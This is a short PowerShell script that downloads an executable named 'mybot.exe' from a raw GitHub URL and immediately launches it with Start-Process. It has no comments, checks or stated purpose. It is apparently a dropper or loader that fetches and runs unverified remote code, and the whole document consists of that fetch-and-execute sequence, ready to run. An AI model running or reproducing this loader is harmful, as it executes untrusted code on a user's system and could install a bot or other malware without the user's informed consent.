$url = "https://raw.githubusercontent.com/Algorithm99root/wow/refs/heads/main/mybot.exe"
$outputFile = ".\mybot.exe"
Invoke-WebRequest -Uri $url -OutFile $outputFile
if (Test-Path $outputFile) { Start-Process $outputFile }